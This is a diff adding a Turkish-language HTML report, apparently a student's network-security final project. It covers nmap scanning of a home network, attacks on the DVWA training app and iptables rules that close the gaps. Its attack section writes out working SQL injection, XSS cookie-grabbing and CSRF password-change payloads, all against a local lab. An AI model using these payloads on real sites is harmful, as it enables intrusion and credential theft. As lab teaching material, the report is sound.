+const vulnCanvas = document.getElementById('vulnChart');
+const vulnCtx = vulnCanvas.getContext('2d');
+vulnCanvas.width = vulnCanvas.parentElement.clientWidth - 32 || 280;
+const vulnData = [
+  { label:'SQL Injection', count:2, color:'#ff4757' },
+  { label:'XSS', count:2, color:'#ff8c00' },
+  { label:'CSRF', count:1, color:'#ffd700' },
+  { label:'Ağ (Telnet/HTTP)', count:2, color:'#00d4ff' },
+  { label:'UPnP', count:1, color:'#6e7681' },
+];
+const vw = vulnCanvas.width / vulnData.length - 8;
+vulnData.forEach((d,i) => {
+  const x = i * (vw + 8) + 4;
+  const barH = (d.count / 2) * 60;
+  const y = 70 - barH;
+  const grad = vulnCtx.createLinearGradient(0, y, 0, 70);
+  grad.addColorStop(0, d.color);
+  grad.addColorStop(1, d.color + '20');
+  vulnCtx.fillStyle = grad;
+  vulnCtx.beginPath();
+  vulnCtx.roundRect(x, y, vw, barH, [3,3,0,0]);
+  vulnCtx.fill();
+  // Count
+  vulnCtx.fillStyle = d.color;
+  vulnCtx.font = 'bold 14px Rajdhani, sans-serif';
+  vulnCtx.textAlign = 'center';
+  vulnCtx.fillText(d.count, x + vw/2, y - 6);
+  // Label
+  vulnCtx.fillStyle = '#6e7681';
+  vulnCtx.font = '8px Share Tech Mono, monospace';
+  const words = d.label.split(' ');
+  words.forEach((w,wi) => {
+    vulnCtx.fillText(w, x + vw/2, 82 + wi * 11);
+  });
+});
+
+// ═══════════════════════════════
+// IPTABLES LOG STREAM
+// ═══════════════════════════════
+const logMessages = [
+  { cls:'log-drop', msg:'[DROP] IN=eth0 SRC=10.0.0.5 DST=192.168.X.3 PROTO=TCP DPT=23 — Telnet engellendi' },
+  { cls:'log-acc', msg:'[ACCEPT] IN=eth0 SRC=192.168.X.7 DST=192.168.X.1 PROTO=TCP DPT=80 — Yerel erişim izinli' },
+  { cls:'log-drop', msg:'[DROP] IN=eth0 SRC=203.0.113.42 DST=192.168.X.1 PROTO=TCP DPT=80 — Dış IP engellendi' },
+  { cls:'log-warn', msg:'[LIMIT] IN=eth0 SRC=185.220.101.5 PROTO=TCP FLAGS=SYN — SYN flood tespit edildi, sınırlandı' },
+  { cls:'log-drop', msg:'[DROP] IN=eth0 SRC=45.33.32.156 PROTO=TCP FLAGS=SYN — Port tarama engellendi (Nmap?)' },
+  { cls:'log-acc', msg:'[ACCEPT] IN=eth0 SRC=192.168.X.4 DST=192.168.X.1 PROTO=TCP DPT=443 — HTTPS izinli' },
+  { cls:'log-drop', msg:'[DROP] IN=eth0 SRC=91.108.4.11 DST=192.168.X.3 PROTO=TCP DPT=23 — Telnet engellendi' },
+  { cls:'log-warn', msg:'[LIMIT] IN=eth0 SRC=198.51.100.7 PROTO=TCP FLAGS=SYN — SYN rate limit devrede' },
+  { cls:'log-acc', msg:'[ACCEPT] IN=eth0 SRC=192.168.X.2 DST=192.168.X.1 PROTO=TCP DPT=53 — DNS sorgusu izinli' },
+  { cls:'log-drop', msg:'[DROP] IN=eth0 SRC=172.16.0.99 DST=192.168.X.1 PROTO=TCP DPT=80 — Dış ağ engellendi' },
+  { cls:'log-info', msg:'[INFO] iptables-save tamamlandı — /etc/iptables.rules güncellendi' },
+  { cls:'log-drop', msg:'[DROP] IN=eth0 SRC=104.21.0.1 PROTO=TCP FLAGS=SYN — Port scan engellendi' },
+];
+
+let logIdx = 0;
+const logStream = document.getElementById('logStream');
+const logTime = document.getElementById('logTime');
+
+function addLog() {
+  const now = new Date();
+  const ts = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
+  logTime.textContent = ts;
+  const msg = logMessages[logIdx % logMessages.length];
+  const line = document.createElement('div');
+  line.className = msg.cls;
+  line.textContent = `[${ts}] ${msg.msg}`;
+  logStream.appendChild(line);
+  logStream.scrollTop = logStream.scrollHeight;
+  if (logStream.children.length > 40) logStream.removeChild(logStream.firstChild);
+  logIdx++;
+}
+
+// İlk 6 log anında
+for(let i=0;i<6;i++) addLog();
+// Sonra her 1.8 saniyede bir
+setInterval(addLog, 1800);
+</script>
+
+<div class="section-divider"></div>
+
+<section id="kesif" class="reveal">
+  <div class="section-header">
+    <div class="section-num">// 01</div>
+    <div class="section-title"><span class="c">Keşif</span> Aşaması — Nmap</div>
+    <div class="section-line"></div>
+  </div>
+  <p>Sızma testinin ilk adımı keşiftir. Hedef ağda hangi cihazlar var, hangi portlar açık, hangi servisler çalışıyor tespit edilir.</p>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-cyan">ADIM 1</span> Host Keşfi — Ping Sweep</div>
+    <div class="terminal">
+      <div class="terminal-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g2"></div><div class="terminal-title">Windows PowerShell</div></div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">PS C:\Users\kullanici></span> <span class="t-cmd">nmap -sn 192.168.X.0/24</span></div>
+        <div class="t-highlight">Nmap scan report for 192.168.X.1 — Host is up (0.011s latency)</div>
+        <div class="t-out">MAC Address: AA:BB:CC:DD:EE:01 (Huawei Technologies)</div>
+        <div class="t-highlight">Nmap scan report for 192.168.X.3 — Host is up (0.008s latency)</div>
+        <div class="t-out">MAC Address: AA:BB:CC:DD:EE:03 (Humax)</div>
+        <div class="t-out">Nmap done: 256 IP addresses (5 hosts up) scanned in 17.04 seconds</div>
+      </div>
+    </div>
+    <table class="data-table">
+      <thead><tr><th>IP Adresi</th><th>MAC Adresi</th><th>Cihaz</th><th>Durum</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">192.168.X.1</td><td class="mono">AA:BB:CC:DD:EE:01</td><td>Huawei Modem/Router</td><td class="ok">Aktif</td></tr>
+        <tr><td class="mono">192.168.X.2</td><td class="mono">AA:BB:CC:DD:EE:02</td><td>Bilinmiyor (Telefon)</td><td class="ok">Aktif</td></tr>
+        <tr><td class="mono">192.168.X.3</td><td class="mono">AA:BB:CC:DD:EE:03</td><td>Humax TV Kutusu</td><td class="warn">Aktif ⚠</td></tr>
+        <tr><td class="mono">192.168.X.4</td><td class="mono">AA:BB:CC:DD:EE:04</td><td>Bilinmiyor (iPhone)</td><td class="ok">Aktif</td></tr>
+        <tr><td class="mono">192.168.X.7</td><td class="mono">—</td><td>Test Bilgisayarı</td><td class="ok">Bu Sistem</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-cyan">ADIM 2</span> Port & Servis Tarama</div>
+    <div class="code-block"><span class="prompt">$</span> nmap -sV --top-ports 1000 192.168.X.1 192.168.X.2 192.168.X.3 192.168.X.4 -oX tarama.xml</div>
+    <table class="data-table">
+      <thead><tr><th>IP</th><th>Port</th><th>Servis</th><th>Risk</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">192.168.X.1</td><td class="mono">53/tcp</td><td>DNS</td><td class="ok">Normal</td></tr>
+        <tr><td class="mono">192.168.X.1</td><td class="mono">80/tcp</td><td>HTTP — Modem Paneli</td><td class="warn">Orta ⚠</td></tr>
+        <tr><td class="mono">192.168.X.1</td><td class="mono">443/tcp</td><td>HTTPS</td><td class="ok">Normal</td></tr>
+        <tr><td class="mono">192.168.X.3</td><td class="mono">23/tcp</td><td>Telnet</td><td class="danger">KRİTİK 🔴</td></tr>
+        <tr><td class="mono">192.168.X.4</td><td class="mono">62078/tcp</td><td>iOS Cihaz Portu</td><td class="ok">Normal</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-cyan">ADIM 3</span> OS Tespiti, NSE Scriptleri & Telnet Denemesi</div>
+    <div class="code-block"><span class="prompt">$</span> nmap -O --script http-headers,banner 192.168.X.1 192.168.X.3</div>
+    <div class="grid-2">
+      <div>
+        <p style="color:var(--cyan);font-family:var(--font-mono);font-size:12px;margin-bottom:8px;">192.168.X.1 — Huawei Modem</p>
+        <p>OS: <strong style="color:var(--text-bright)">Linux 2.6.x</strong> (%97 güven)</p>
+        <div class="code-block" style="font-size:11px;">X-Frame-Options: SAMEORIGIN<br>X-XSS-Protection: 1; mode=block<br>CACHE-CONTROL: no-cache</div>
+      </div>
+      <div>
+        <p style="color:var(--red);font-family:var(--font-mono);font-size:12px;margin-bottom:8px;">192.168.X.3 — Humax TV — Telnet Denemesi</p>
+        <p>OS: <strong style="color:var(--text-bright)">Linux 2.6.32-3.10</strong> (%95 güven)</p>
+        <div class="code-block" style="font-size:11px;border-color:var(--red);">
+          <span style="color:var(--red)">telnet 192.168.X.3</span><br>
+          23/tcp open tcpwrapped<br>
+          <span style="color:var(--text-dim)">Bağlantı denendi → reddedildi</span><br>
+          <span style="color:var(--orange)">Port açık ama erişim kısıtlı!</span>
+        </div>
+        <div style="background:#010409;border:1px solid var(--orange);border-radius:8px;padding:14px;margin-top:12px;font-size:12px;line-height:1.8;">
+          <div style="color:var(--orange);font-family:var(--font-mono);font-size:10px;letter-spacing:2px;margin-bottom:8px;">// ANALİZ — NEDEN BAĞLANAMADK?</div>
+          <p style="margin:0;color:var(--text)">Port 23 Nmap tarafından <span style="color:var(--red);font-family:var(--font-mono)">tcpwrapped</span> olarak işaretlenmesine rağmen doğrudan bağlantı reddedilmiştir. Bu durum cihaz üzerinde yerleşik bir <strong style="color:var(--text-bright)">ACL (Erişim Kontrol Listesi)</strong> bulunduğunu — muhtemelen yalnızca servis sağlayıcının yönetim IP'lerine izin verildiğini — göstermektedir. Ancak protokolün kendisi şifresiz (clear-text) iletişim kullandığından, portun ağda açık bulunması <strong style="color:var(--red)">her halükarda kritik bir zafiyettir.</strong> ACL kaldırıldığı veya devre dışı bırakıldığı anda tüm trafik açık metin olarak dinlenebilir.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-cyan">ADIM 4</span> Wireshark Paket Yakalama</div>
+    <div class="grid-3">
+      <div style="text-align:center;padding:16px;"><div style="font-size:36px;font-family:var(--font-ui);font-weight:700;color:var(--cyan)">4374</div><div style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim)">TOPLAM PAKET</div></div>
+      <div style="text-align:center;padding:16px;"><div style="font-size:36px;font-family:var(--font-ui);font-weight:700;color:var(--orange)">2389</div><div style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim)">NMAP PAKETİ</div></div>
+      <div style="text-align:center;padding:16px;"><div style="font-size:36px;font-family:var(--font-ui);font-weight:700;color:var(--green)">47.79s</div><div style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim)">YAKALAMA SÜRESİ</div></div>
+    </div>
+    <p style="font-size:13px;color:var(--text-dim)">SYN-ACK alınan portlar: <span style="color:var(--cyan);font-family:var(--font-mono)">53, 80, 443, 631</span></p>
+  </div>
+</section>
+
+<div class="section-divider"></div>
+
+<section id="saldiri" class="reveal">
+  <div class="section-header">
+    <div class="section-num">// 02</div>
+    <div class="section-title"><span class="r">Saldırı</span> Aşaması — DVWA</div>
+    <div class="section-line"></div>
+  </div>
+  <p>Keşif aşamasından elde edilen bilgiler kullanılarak DVWA üzerinde web uygulama saldırıları gerçekleştirildi.</p>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-red">SQLi UNION</span> Classic UNION SQL Injection</div>
+    <div class="timeline">
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-title">Kolon Sayısı Tespiti</div>
+        <div class="code-block"><span class="prompt">></span> 1' ORDER BY 2# <span class="comment">→ Sonuç geldi ✓</span><br><span class="prompt">></span> 1' ORDER BY 3# <span class="comment">→ HATA — 2 kolon var!</span></div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-title">Veritabanı Adı Tespiti</div>
+        <div class="code-block"><span class="prompt">></span> ' UNION SELECT database(),user()#<br><span class="result">First name: <span style="color:var(--green)">dvwa</span>  |  Surname: <span style="color:var(--green)">app@localhost</span></span></div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot red"></div>
+        <div class="timeline-title" style="color:var(--red)">Şifre Hash'leri Ele Geçirildi!</div>
+        <div class="code-block" style="border-color:var(--red)"><span class="prompt">></span> ' UNION SELECT user,password FROM users#</div>
+        <table class="data-table">
+          <thead><tr><th>Kullanıcı</th><th>MD5 Hash</th></tr></thead>
+          <tbody>
+            <tr><td>admin</td><td class="mono danger">5f4dcc3b5aa765d61d8327deb882cf99</td></tr>
+            <tr><td>gordonb</td><td class="mono danger">e99a18c428cb38d5f260853678922e03</td></tr>
+            <tr><td>1337</td><td class="mono danger">8d3533d75ae2c3966d7e0d4fcc69216b</td></tr>
+            <tr><td>pablo</td><td class="mono danger">0d107d09f5bbe40cade3de5c71e9e9b7</td></tr>
+            <tr><td>smithy</td><td class="mono danger">5f4dcc3b5aa765d61d8327deb882cf99</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-red">SQLi BLIND</span> Blind SQL Injection</div>
+    <div class="grid-2">
+      <div>
+        <p style="color:var(--green);font-family:var(--font-mono);font-size:12px;">TRUE Koşulu</p>
+        <div class="code-block" style="border-color:var(--green)">1' AND 1=1#<br><span style="color:var(--green)">→ "User ID exists"</span></div>
+      </div>
+      <div>
+        <p style="color:var(--red);font-family:var(--font-mono);font-size:12px;">FALSE Koşulu</p>
+        <div class="code-block" style="border-color:var(--red)">1' AND 1=2#<br><span style="color:var(--red)">→ Boş yanıt</span></div>
+      </div>
+    </div>
+    <div class="code-block">1' AND database()='dvwa'# <span class="comment">→ EXISTS — Veritabanı adı doğrulandı!</span></div>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-orange">XSS</span> Reflected & Stored XSS — Cookie Çalma</div>
+    <div class="grid-2">
+      <div>
+        <p style="color:var(--orange);font-family:var(--font-mono);font-size:12px;margin-bottom:8px;">Reflected XSS</p>
+        <div class="code-block" style="border-color:var(--orange)">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+        <p style="font-size:12px;">Sadece o anki kullanıcıyı etkiler.</p>
+      </div>
+      <div>
+        <p style="color:var(--red);font-family:var(--font-mono);font-size:12px;margin-bottom:8px;">Stored XSS</p>
+        <div class="code-block" style="border-color:var(--red)">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+        <p style="font-size:12px;">Veritabanına kaydedildi — Sayfayı açan herkes etkilenir!</p>
+      </div>
+    </div>
+    <div style="background:#010409;border:1px solid var(--red);border-radius:8px;padding:16px;margin-top:12px;">
+      <p style="font-family:var(--font-mono);font-size:11px;color:var(--red);margin-bottom:8px;">// ELE GEÇİRİLEN COOKIE BİLGİLERİ</p>
+      <p style="font-family:var(--font-mono);font-size:12px;color:var(--text)">PHPSESSID=<span style="color:var(--red)">hhbo3lf27dlv9gjq4ccl2lt6e2</span> <span style="color:var(--text-dim)">← Session Hijacking riski!</span><br>csrftoken=<span style="color:var(--yellow)">xXVEq5i483lH900Ii2LkX67RQ3nfBOTU</span><br>security=<span style="color:var(--green)">low</span></p>
+    </div>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title"><span class="badge badge-orange">CSRF</span> Cross-Site Request Forgery</div>
+    <p>Kurban aşağıdaki URL'ye tıkladığında şifresi otomatik değişti — form doldurmaya gerek yok!</p>
+    <div class="code-block" style="border-color:var(--orange);word-break:break-all;">http://localhost:8080/vulnerabilities/csrf/?<span style="color:var(--orange)">password_new=hacked123</span>&amp;password_conf=hacked123&amp;Change=Change</div>
+    <p style="color:var(--red);font-size:13px;">Sonuç: "Password Changed." — Şifre hacked123 olarak değiştirildi!</p>
+  </div>
+</section>
+
+<div class="section-divider"></div>
+
+<section id="savunma" class="reveal">
+  <div class="section-header">
+    <div class="section-num">// 03</div>
+    <div class="section-title"><span class="g">Savunma</span> Aşaması — iptables</div>
+    <div class="section-line"></div>
+  </div>
+  <p>Keşif ve saldırı aşamalarında tespit edilen zafiyetler iptables güvenlik duvarı kurallarıyla kapatıldı.</p>
+
+  <div class="terminal reveal">
+    <div class="terminal-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g2"></div><div class="terminal-title">root@ubuntu-fw2:/ — Docker Ubuntu 22.04</div></div>
+    <div class="terminal-body">
+      <div><span class="t-prompt">PS></span> <span class="t-cmd">docker run -it --privileged --name ubuntu-fw2 ubuntu:22.04 bash</span></div>
+      <div><span class="t-prompt">root@ubuntu-fw2:/#</span> <span class="t-cmd">apt-get install -y iptables</span></div>
+      <div class="t-out">Setting up iptables (1.8.7-1ubuntu5.2) ... ✓</div>
+      <div><span class="t-prompt">root@ubuntu-fw2:/#</span> <span class="t-cmd">iptables -L -n -v</span></div>
+      <div class="t-highlight">Chain INPUT (policy ACCEPT) — Kurallar uygulanıyor...</div>
+    </div>
+  </div>
+
+  <div style="margin-top:24px;">
+    <div class="rule-card reveal">
+      <div class="rule-num">01</div>
+      <div><div class="rule-code">iptables -A INPUT -p tcp --dport 23 -j DROP</div><div class="rule-desc">Telnet portunu tamamen engelle — Port 23'e gelen tüm bağlantılar düşürülür</div></div>
+      <div><span class="badge badge-red">KRİTİK</span></div>
+    </div>
+    <div class="rule-card reveal">
+      <div class="rule-num">02</div>
+      <div><div class="rule-code">iptables -A INPUT -p tcp --dport 80 ! -s 192.168.X.0/24 -j DROP</div><div class="rule-desc">HTTP'yi sadece yerel ağa kısıtla — Dış kaynaklı erişim engellendi</div></div>
+      <div><span class="badge badge-orange">ORTA</span></div>
+    </div>
+    <div class="rule-card reveal">
+      <div class="rule-num">03</div>
+      <div><div class="rule-code">iptables -A INPUT -p tcp --tcp-flags ALL SYN -m limit --limit 1/s -j ACCEPT</div><div class="rule-desc">SYN flood sınırla — Saniyede max 1 SYN paketi kabul edilir</div></div>
+      <div><span class="badge badge-yellow">ÖNLEM</span></div>
+    </div>
+    <div class="rule-card reveal">
+      <div class="rule-num">04</div>
+      <div><div class="rule-code">iptables -A INPUT -p tcp --tcp-flags ALL SYN -j DROP</div><div class="rule-desc">Port tarama engelle — Nmap SYN taraması artık çalışmaz</div></div>
+      <div><span class="badge badge-green">SAVUNMA</span></div>
+    </div>
+  </div>
+
+  <!-- DROP vs LOG Analizi -->
+  <div class="card reveal" style="margin-top:20px;border-color:rgba(255,215,0,0.3);">
+    <div class="card-title"><span class="badge badge-yellow">ANALİZ</span> DROP Yeterli mi? — Loglama Gerekliliği</div>
+    <p>Mevcut kurallar paketleri sessizce <span style="color:var(--red);font-family:var(--font-mono)">DROP</span> etmektedir. Bir saldırgan sürekli sisteme vursa bile sistem yöneticisinin bundan haberi olmaz. Bu ciddi bir görünürlük sorunudur.</p>
+    <div class="grid-2" style="margin-top:12px;">
+      <div>
+        <p style="color:var(--red);font-family:var(--font-mono);font-size:12px;margin-bottom:8px;">❌ Mevcut Durum</p>
+        <div class="code-block" style="border-color:var(--red);font-size:12px;">iptables -A INPUT -p tcp --dport 23 -j DROP<br><span style="color:var(--text-dim)"># Sessiz düşürme — kimse görmez</span></div>
+      </div>
+      <div>
+        <p style="color:var(--green);font-family:var(--font-mono);font-size:12px;margin-bottom:8px;">✅ Önerilen Çözüm</p>
+        <div class="code-block" style="border-color:var(--green);font-size:12px;">iptables -A INPUT -p tcp --dport 23 -j LOG --log-prefix "TELNET_BLOCKED: "<br>iptables -A INPUT -p tcp --dport 23 -j DROP<br><span style="color:var(--text-dim)"># Önce logla, sonra düşür</span></div>
+      </div>
+    </div>
+    <div style="background:#010409;border:1px solid var(--yellow);border-radius:8px;padding:14px;margin-top:12px;font-size:12px;line-height:1.8;">
+      <div style="color:var(--yellow);font-family:var(--font-mono);font-size:10px;letter-spacing:2px;margin-bottom:8px;">// EK ÖNERİLER</div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <div><span style="color:var(--cyan);font-family:var(--font-mono)">fail2ban</span><span style="color:var(--text-dim)"> — Belirli bir IP'den çok fazla istek gelirse otomatik geçici ban uygular</span></div>
+        <div><span style="color:var(--cyan);font-family:var(--font-mono)">rsyslog/syslog</span><span style="color:var(--text-dim)"> — iptables loglarını merkezi log sunucusuna iletir, kalıcı kayıt sağlar</span></div>
+        <div><span style="color:var(--cyan);font-family:var(--font-mono)">SIEM entegrasyonu</span><span style="color:var(--text-dim)"> — Loglar analiz edilerek anormal trafik pattern'leri otomatik tespit edilir</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Dashboard Notu -->
+  <div class="card reveal" style="margin-top:16px;border-color:rgba(0,212,255,0.2);">
+    <div class="card-title"><span class="badge badge-cyan">NOT</span> Dashboard & Topoloji Hakkında</div>
+    <p style="font-size:13px;">Bu rapordaki ağ topolojisi ve iptables log akışı, gerçek Nmap ve iptables verilerinin görselleştirilmesidir. Canlı bir sistemde bu veriler bir <strong style="color:var(--text-bright)">backend API</strong> üzerinden beslenirdi — örneğin <span style="color:var(--cyan);font-family:var(--font-mono)">Python Flask + python-nmap</span> kütüphanesi ile anlık ağ taraması yapılıp veriler frontend'e aktarılabilir. Bu projede tarayıcı güvenlik kısıtlamaları nedeniyle statik veri simülasyonu kullanılmıştır.</p>
+  </div>
+
+  <div class="card reveal" style="margin-top:20px;">
+    <div class="card-title">Kaydedilen Kural Seti — /etc/iptables.rules</div>
+    <div class="terminal">
+      <div class="terminal-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g2"></div><div class="terminal-title">cat /etc/iptables.rules</div></div>
+      <div class="terminal-body">
+        <div class="t-out"># Generated by iptables-save v1.8.7 on Sun May 24 10:49:21 2026</div>
+        <div class="t-highlight">*filter</div>
+        <div class="t-cmd">-A INPUT -p tcp -m tcp --dport 23 -j DROP</div>
+        <div class="t-cmd">-A INPUT ! -s 192.168.X.0/24 -p tcp -m tcp --dport 80 -j DROP</div>
+        <div class="t-cmd">-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG SYN -m limit --limit 1/sec -j ACCEPT</div>
+        <div class="t-cmd">-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG SYN -j DROP</div>
+        <div class="t-highlight">COMMIT</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="section-divider"></div>
+
+<section id="ozet" class="reveal">
+  <div class="section-header">
+    <div class="section-num">// 04</div>
+    <div class="section-title">Zafiyet <span class="r">Özet</span> Raporu</div>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title">CVSS Skor Dağılımı</div>
+    <div style="padding:8px 0;">
+      <div class="cvss-bar"><div class="cvss-label">UNION SQL Injection</div><div class="cvss-track"><div class="cvss-fill critical" style="width:98%"></div></div><div class="cvss-score critical">9.8</div></div>
+      <div class="cvss-bar"><div class="cvss-label">Stored XSS</div><div class="cvss-track"><div class="cvss-fill critical" style="width:88%"></div></div><div class="cvss-score critical">8.8</div></div>
+      <div class="cvss-bar"><div class="cvss-label">Blind SQL Injection</div><div class="cvss-track"><div class="cvss-fill critical" style="width:86%"></div></div><div class="cvss-score critical">8.6</div></div>
+      <div class="cvss-bar"><div class="cvss-label">CSRF</div><div class="cvss-track"><div class="cvss-fill high" style="width:81%"></div></div><div class="cvss-score high">8.1</div></div>
+      <div class="cvss-bar"><div class="cvss-label">Telnet Açık (Port 23)</div><div class="cvss-track"><div class="cvss-fill high" style="width:75%"></div></div><div class="cvss-score high">7.5</div></div>
+      <div class="cvss-bar"><div class="cvss-label">Reflected XSS</div><div class="cvss-track"><div class="cvss-fill high" style="width:74%"></div></div><div class="cvss-score high">7.4</div></div>
+      <div class="cvss-bar"><div class="cvss-label">HTTP Yönetim Paneli</div><div class="cvss-track"><div class="cvss-fill medium" style="width:65%"></div></div><div class="cvss-score medium">6.5</div></div>
+      <div class="cvss-bar"><div class="cvss-label">UPnP Açık</div><div class="cvss-track"><div class="cvss-fill medium" style="width:55%"></div></div><div class="cvss-score medium">5.5</div></div>
+    </div>
+  </div>
+
+  <div class="card reveal">
+    <div class="card-title">Proje Özeti</div>
+    <table class="data-table">
+      <thead><tr><th>Aşama</th><th>Araç</th><th>Sonuç</th></tr></thead>
+      <tbody>
+        <tr><td><span class="badge badge-cyan">Keşif</span></td><td>Nmap 7.99</td><td>5 cihaz, 8 açık port, 2 kritik zafiyet (Telnet, HTTP)</td></tr>
+        <tr><td><span class="badge badge-red">Saldırı</span></td><td>DVWA</td><td>5 şifre hash'i, cookie bilgileri, CSRF ile şifre değişimi</td></tr>
+        <tr><td><span class="badge badge-green">Savunma</span></td><td>iptables</td><td>4 kural ile Telnet, port tarama ve SYN flood engellendi</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<footer>
+  <div class="footer-text">
+    <span>BİLGİSAYAR AĞ GÜVENLİĞİ</span> — FİNAL PROJESİ — <span>ÖMER FARUK ÖZGÜR</span> — 22430070048<br>
+    <span style="color:var(--text-dim)">Bilişim Sistemleri ve Teknolojileri - 4 &nbsp;|&nbsp; Mayıs 2026</span>
+  </div>
+</footer>
+
+<script>
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+
+  const sections = document.querySelectorAll('section[id]');
+  window.addEventListener('scroll', () => {
+    let current = '';
+    sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) current = s.id; });
+    document.querySelectorAll('nav a').forEach(a => {
+      a.style.color = a.getAttribute('href') === '#' + current ? 'var(--cyan)' : '';
+    });
+  });
+
+  // ═══════════════════════════════
+  // CANLI SUNUCU BAĞLANTISI
+  // ═══════════════════════════════
+  const SERVER = "http://localhost:5000";
+
+  function log(msg, color) {
+    const el = document.getElementById('serverLog');
+    if (el) el.innerHTML = `<span style="color:${color||'#6e7681'}">> ${msg}</span>`;
+  }
+
+  async function checkServer() {
+    try {
+      const r = await fetch(SERVER + "/info", { signal: AbortSignal.timeout(2000) });
+      if (r.ok) {
+        const data = await r.json();
+        document.getElementById('serverDot').style.background = 'var(--green)';
+        document.getElementById('serverStatus').style.color = 'var(--green)';
+        document.getElementById('serverStatus').textContent = `Çevrimiçi — ${data.local_ip}`;
+        log(`Sunucu bulundu! Ağ: ${data.network}`, '#00ff88');
+        return true;
+      }
+    } catch(e) {
+      document.getElementById('serverDot').style.background = 'var(--red)';
+      document.getElementById('serverStatus').style.color = 'var(--text-dim)';
+      document.getElementById('serverStatus').textContent = 'Sunucu kapalı — Simülasyon modu';
+      log('Sunucu bulunamadı. "python ag_tarama_server.py" komutuyla başlatın.', '#ff4757');
+      return false;
+    }
+  }
+
+  async function connectServer() {
+    log('Sunucuya bağlanılıyor...', '#ffd700');
+    const online = await checkServer();
+    if (!online) return;
+    log('Host taraması başlatıldı, lütfen bekleyin...', '#ffd700');
+    try {
+      const r = await fetch(SERVER + "/scan/hosts");
+      const data = await r.json();
+      if (!data.success) { log('Tarama başarısız: ' + data.error, '#ff4757'); return; }
+      log(`${data.host_count} cihaz bulundu! Topoloji güncelleniyor...`, '#00ff88');
+      updateTopologyFromServer(data.hosts, data.local_ip);
+    } catch(e) {
+      log('Bağlantı hatası: ' + e.message, '#ff4757');
+    }
+  }
+
+  function updateTopologyFromServer(hosts, localIp) {
+    // Güvenlik kontrolü
+    if (!hosts || hosts.length === 0) {
+      log('Cihaz bulunamadı, simülasyon moduna geçildi.', '#ff8c00');
+      useMockData(); return;
+    }
+
+    const colorMap = { 'Huawei': '#00d4ff', 'Humax': '#ff4757', 'Apple': '#ff8c00', 'Samsung': '#ffd700' };
+
+    resizeCanvas();
+    const cx = canvas.width / 2, cy = canvas.height / 2;
+    const rad = Math.min(cx, cy) * 0.55;
+
+    links = [];
+    packets.length = 0;
+    devices.length = 0;
+
+    // Merkez cihazı belirle — önce gateway (1), sonra local IP, sonra ilk cihaz
+    const gatewayIp = localIp.split('.').slice(0,3).join('.') + '.1';
+    const center = hosts.find(h => h.ip === gatewayIp)
+                || hosts.find(h => h.ip === localIp)
+                || hosts[0];
+
+    if (!center) { log('Merkez cihaz belirlenemedi.', '#ff4757'); useMockData(); return; }
+
+    const others = hosts.filter(h => h.ip !== center.ip);
+
+    // Merkeze ekle
+    const centerColor = Object.entries(colorMap).find(([k]) => (center.vendor||'').includes(k))?.[1] || '#00d4ff';
+    devices.push({
+      id: 'dev0', x: cx, y: cy,
+      label: center.ip,
+      name: center.vendor || 'Router/Gateway',
+      icon: center.ip === localIp ? 'PC' : 'GW',
+      color: center.ip === localIp ? '#00ff88' : centerColor,
+      ports: ['Taranıyor...'], os: 'Bilinmiyor', risk: 'NORMAL', mac: center.mac || '—'
+    });
+
+    // Diğerlerini etrafına diz
+    others.forEach((h, i) => {
+      if (!h || !h.ip) return;
+      const angle = (i / Math.max(others.length, 1)) * Math.PI * 2 - Math.PI / 2;
+      const isLocal = h.ip === localIp;
+      const color = isLocal ? '#00ff88'
+                  : Object.entries(colorMap).find(([k]) => (h.vendor||'').includes(k))?.[1] || '#6e7681';
+      const icon = isLocal ? 'PC' : (h.vendor || 'X')[0].toUpperCase();
+      devices.push({
+        id: 'dev' + (i + 1),
+        x: cx + rad * Math.cos(angle),
+        y: cy + rad * Math.sin(angle),
+        label: h.ip,
+        name: isLocal ? 'Bu Bilgisayar' : (h.vendor || 'Bilinmiyor'),
+        icon, color,
+        ports: ['Taranıyor...'], os: 'Bilinmiyor', risk: 'NORMAL', mac: h.mac || '—'
+      });
+      links.push(['dev0', 'dev' + (i + 1)]);
+    });
+
+    log(`${devices.length} cihaz topolojiye eklendi. Port taraması başlıyor...`, '#00ff88');
+
+    // Her cihaz için port taraması
+    hosts.forEach(async (h) => {
+      if (!h || !h.ip) return;
